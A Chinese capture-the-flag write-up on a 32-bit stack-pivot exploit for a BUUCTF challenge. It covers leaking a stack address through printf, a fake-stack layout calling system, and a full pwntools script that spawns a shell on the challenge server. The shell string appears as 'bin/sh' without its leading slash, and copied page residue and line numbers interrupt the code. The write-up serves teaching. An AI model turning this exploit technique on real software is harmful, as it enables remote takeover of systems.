step 1 寻找目标地址
我们要确定目标地址是哪里，这个题中我们可以将 s 作为目标地址。那么我们需要知道 s 确切的地址。
如何获得 s 的地址呢，我们观察一下 vlu 函数的栈：

打开 gdb，在 main 函数处下断点，找一下 vul 函数的地址

在 vul 函数处下断点，然后单步步入，进入函数 vul

查看一下 vul 的汇编 
因为我们想要知道 s 的地址，所以我们先输入字符‘aaaa’，然后看看栈中的情况
在 printf 函数前打个断点，因为要先执行一个 read 函数输入‘aaaa’

我们观察栈中的情况，eax 和 ecx 指向的地方就是 s 的地址，但是这个地址是我们本地地址，你要打远程主机不能用这个。所以我们要想方法暴露一个栈上的地址 x，然后算 x 和 s 的偏移 y，那么 s 的地址就是 x+y。
我们可以看到 ebp 指向的地方存了一个地址 0xffffd 008，这是上一个栈帧的 ebp，它距离 s 的地址的偏移是 56。那么如果可以将它暴露，就可以求得 s 的地址了。
程序中有 printf 函数，该函数在未遇到终止符 '\0’时会一直输出，那么我们可以利用 printf 将栈上的值输出，得到 ebp 指向的值。
from pwn import *

p = remote("node4.buuoj.cn", 26588)

payload1 = b'a' * 0x27 + b'b'
p.send(payload1) # sendline会有终止符
p.recvuntil('b')
s_addr = u32(p.recv(4)) - 56
print(hex(s_addr))
AI写代码
python
运行
1
2
3
4
5
6
7
8
9


step 2 构造 payload
要实现栈迁移，只要把 ebp 和 return 位置覆盖为目标地址和 leave&ret 地址就 ok 了。那么迁移后的 fake 栈上应该如何布局呢。
程序中有 system 函数，但是没有 bin/sh 字符串。那么 fake 栈应该这样布局：
system_addr + fake_ret + bin_sh_addr + bin_sh_str
综上所述，最终的 payload 应该是
‘aaaa’ + system_addr + fake_ret + bin_sh_addr + bin_sh_str + padding + s_addr + leave&ret_addr
最前面的 4 个字节的 aaaa 是为了抵消掉 leave 指令中 pop ebp 导致的 esp 上移，中间的 padding 是为了补全 0x28 个字节。
完整的 exp：

from pwn import *

p = remote("node4.buuoj.cn", 26588)
payload1 = b'a' * 0x27 + b'b'
p.send(payload1) # sendline会有终止符
p.recvuntil('b')
s_addr = u32(p.recv(4)) - 56
print('s_addr: ', hex(s_addr))

system_addr = 0x08048400
leave_ret = 0x080484b8

payload2 = b'aaaa' + p32(system_addr) + b'aaaa'
payload2  = payload2 + p32(s_addr + 0x10)
payload2 = payload2 + b'bin/sh\x00'
payload2 = payload2.ljust(0x28, b'a')
payload2 = payload2 + p32(s_addr) + p32(leave_ret)

p.sendline(payload2)
p.interactive()
AI写代码
python
运行

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
注意 payload2 中 bin/sh 字符串要加终止符
